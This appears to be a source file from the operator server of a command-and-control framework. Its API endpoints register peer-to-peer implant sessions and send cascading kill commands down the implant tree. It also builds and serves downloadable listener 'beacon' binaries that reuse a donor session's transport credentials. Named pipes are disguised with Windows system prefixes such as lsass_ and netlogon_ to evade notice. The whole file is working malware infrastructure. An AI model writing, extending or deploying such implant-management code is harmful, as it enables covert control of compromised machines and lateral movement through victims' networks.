        deploy_mode      = "stageless-plain",
        blob_path        = parent.profile.blob_path,
        blob_path_win    = parent.profile.blob_path_win,
        session_key      = session_key,
        added_at         = _tz.now().isoformat(),
        p2p_parent_guid    = parent.profile.session_id,
        p2p_link_type      = link_type,
        p2p_link_address   = bind_addr,
        p2p_is_internal    = True,
        p2p_guid           = p2p_guid,
    )

    creds_path = project_dir / creds_file
    try:
        creds = _load_creds_file(creds_path)
    except FileNotFoundError:
        creds = _load_creds_file(project_dir / parent.profile.creds_file)

    transport_cls = TRANSPORT_REGISTRY.get(parent.profile.provider)
    if not transport_cls:
        _log.error("jump: unknown provider '%s'", parent.profile.provider)
        return

    transport = transport_cls(creds)
    session = Session(profile, transport, project_dir, key_password)
    session.polling_stopped = True
    session.state.update(state="linked")

    async def _do_add():
        await sm.add(session)
        # Update parent's children list
        children = set(
            c.strip()
            for c in getattr(parent.profile, 'p2p_children_guids', '').split(",")
            if c.strip()
        )
        children.add(child_session_id)
        parent.profile.p2p_children_guids = ",".join(sorted(children))
        sm.save_session(parent.profile.session_id)
        sm.save_session(child_session_id)

        pending = sm.pending(child_session_id)
        payload = _session_summary(session, pending)
        payload["deployed_by"] = username
        await ws.broadcast({"type": "session.new", "payload": payload})
        await ws.broadcast({
            "type": "p2p.link_established",
            "ts": _tz.now().isoformat(),
            "payload": {
                "parent_id": parent.profile.session_id,
                "child_id": child_session_id,
                "link_type": link_type,
                "link_address": bind_addr,
                "operator": username,
            },
        })
        await ws.broadcast({
            "type": "topology_changed",
            "ts": _tz.now().isoformat(),
            "payload": {"action": "jump_linked", "parent_id": parent.profile.session_id,
                        "child_id": child_session_id},
        })

    asyncio.run_coroutine_threadsafe(_do_add(), loop).result(timeout=30)


# ── Cascading kill ──────────────────────────────────────────────────────────

def _collect_descendants(sm, session_id: str) -> list[str]:
    """Walk the P2P tree depth-first and return all descendant session IDs."""
    visited: set[str] = set()
    stack = [session_id]
    order: list[str] = []
    while stack:
        sid = stack.pop()
        if sid in visited:
            continue
        visited.add(sid)
        order.append(sid)
        s = sm.get(sid)
        if not s:
            continue
        children_str = getattr(s.profile, 'p2p_children_guids', '')
        if children_str:
            for child_id in children_str.split(","):
                child_id = child_id.strip()
                if child_id and child_id not in visited:
                    stack.append(child_id)
    return order


@router.post("/api/v1/sessions/{session_id}/kill-cascade",
             response_model=CascadeKillResponse)
async def kill_cascade(session_id: str, request: Request,
                       username: str = Depends(get_current_user)):
    """Send kill to a session and all its P2P descendants (leaf-first)."""
    sm = _sm(request)
    _require_session(sm, session_id)

    descendants = _collect_descendants(sm, session_id)
    descendants.reverse()

    killed: list[str] = []
    errors: list[str] = []
    ws = request.app.state.ws

    for sid in descendants:
        s = sm.get(sid)
        if not s:
            continue
        snap = s.state.snapshot()
        if snap.get("state") in ("dead", "killed"):
            continue
        ok, _conflict, cmd_id = await sm.send_command(sid, "KILL", username, display="/kill (cascade)")
        if ok:
            killed.append(sid)
        else:
            errors.append(f"{sid}: command in flight")

    ts = _tz.now().isoformat()
    await ws.broadcast({
        "type": "cascade_kill",
        "ts": ts,
        "payload": {
            "root_session_id": session_id,
            "killed": killed,
            "operator": username,
        },
    })
    await ws.broadcast({
        "type": "topology_changed",
        "ts": ts,
        "payload": {"action": "cascade_kill", "root_id": session_id, "killed": killed},
    })

    return CascadeKillResponse(ok=True, killed=killed, errors=errors)


# ── Generate standalone P2P listener beacon ─────────────────────────────────

@router.post("/api/v1/p2p/generate-listener", response_model=P2PListenerGenResponse,
             status_code=status.HTTP_202_ACCEPTED)
async def generate_p2p_listener(body: P2PListenerGenRequest, request: Request,
                                username: str = Depends(get_current_user)):
    """Build a standalone P2P listener beacon cloning transport creds from a donor session."""
    sm = _sm(request)
    donor = sm.get(body.donor_session_id)
    if not donor:
        raise HTTPException(status_code=404, detail="Donor session not found")

    target_platform = body.platform.lower() if body.platform else "linux"
    bind_type = body.bind_type.lower() if body.bind_type else "tcp"

    if bind_type not in ("tcp", "smb"):
        raise HTTPException(status_code=400, detail="bind_type must be 'tcp' or 'smb'")

    # Determine bind address
    if body.bind_address:
        bind_addr = body.bind_address
    elif bind_type == "smb":
        _PIPE_PREFIXES = ["msrpc_", "lsass_", "spoolss_", "wkssvc_", "srvsvc_", "netlogon_"]
        pipe_name = body.pipe or f"{_PIPE_PREFIXES[secrets.randbelow(len(_PIPE_PREFIXES))]}{secrets.token_hex(4)}"
        bind_addr = f"\\\\.\\pipe\\{pipe_name}"
    else:
        port = body.port if body.port > 0 else 4444 + secrets.randbelow(1000)
        bind_addr = f"0.0.0.0:{port}"

    child_session_id = os.urandom(6).hex()
    p2p_guid = os.urandom(16).hex()

    project_dir = sm._sm.project_dir
    key_password = sm._sm._key_password

    if not _jump_lock.acquire(blocking=False):
        raise HTTPException(status_code=409, detail="Another build is in progress")
    _jump_lock.release()

    ts = _tz.now().isoformat()
    ws = request.app.state.ws
    loop = asyncio.get_running_loop()

    await ws.broadcast({
        "type": "p2p_listener_build_started",
        "ts": ts,
        "payload": {
            "session_id": child_session_id,
            "bind_type": bind_type,
            "bind_address": bind_addr,
            "platform": target_platform,
            "operator": username,
        },
    })

    def _run_build():
        _jump_lock.acquire()
        try:
            binary_path, build_err, child_files = _build_p2p_agent(
                parent_profile=donor.profile,
                project_dir=project_dir,
                child_session_id=child_session_id,
                p2p_guid=p2p_guid,
                bind_addr=bind_addr,
                bind_type=bind_type,
                target_platform=target_platform,
                key_password=key_password,
            )
            if build_err:
                _log.error("p2p-listener: build failed: %s", build_err)
                async def _notify_fail():
                    await ws.broadcast({
                        "type": "p2p_listener_build_failed",
                        "ts": _tz.now().isoformat(),
                        "payload": {
                            "session_id": child_session_id,
                            "error": build_err,
                            "operator": username,
                        },
                    })
                asyncio.run_coroutine_threadsafe(_notify_fail(), loop)
                return

            _child_label = body.label or f"⇢ {donor.profile.label} (P2P {bind_type.upper()})"
            _register_child_session(
                sm=sm,
                parent=donor,
                child_session_id=child_session_id,
                p2p_guid=p2p_guid,
                link_type=bind_type,
                bind_addr=bind_addr,
                project_dir=project_dir,
                key_password=key_password,
                loop=loop,
                ws=ws,
                username=username,
                label=_child_label,
                child_files=child_files,
            )

            async def _notify_ok():
                out_name = "agent.exe" if target_platform == "windows" else "agent"
                await ws.broadcast({
                    "type": "p2p_listener_build_done",
                    "ts": _tz.now().isoformat(),
                    "payload": {
                        "session_id": child_session_id,
                        "bind_type": bind_type,
                        "bind_address": bind_addr,
                        "platform": target_platform,
                        "download_url": f"/api/v1/p2p/listener/{child_session_id}/download/{out_name}",
                        "operator": username,
                    },
                })
            asyncio.run_coroutine_threadsafe(_notify_ok(), loop)

        except Exception as e:
            _log.exception("p2p-listener: unexpected error")
            async def _notify_fail():
                await ws.broadcast({
                    "type": "p2p_listener_build_failed",
                    "ts": _tz.now().isoformat(),
                    "payload": {"session_id": child_session_id, "error": str(e), "operator": username},
                })
            asyncio.run_coroutine_threadsafe(_notify_fail(), loop)
        finally:
            _jump_lock.release()

    threading.Thread(target=_run_build, daemon=True, name=f"p2p-gen-{child_session_id}").start()

    out_name = "agent.exe" if target_platform == "windows" else "agent"
    return P2PListenerGenResponse(
        ok=True,
        session_id=child_session_id,
        bind_type=bind_type,
        bind_address=bind_addr,
        platform=target_platform,
        download_url=f"/api/v1/p2p/listener/{child_session_id}/download/{out_name}",
    )


@router.get("/api/v1/p2p/listener/{session_id}/download/{filename}")
def download_p2p_listener(session_id: str, filename: str,
                          username: str = Depends(get_current_user)):
    """Download a previously generated P2P listener beacon binary."""
    from fastapi.responses import FileResponse

    deploy_dir = Path("deployments") / f"_jump_{session_id}"
    binary = deploy_dir / "agent" / filename
    if not binary.exists():
        raise HTTPException(status_code=404, detail="Binary not found — build may still be in progress")
    return FileResponse(str(binary), filename=filename,
                        media_type="application/octet-stream")
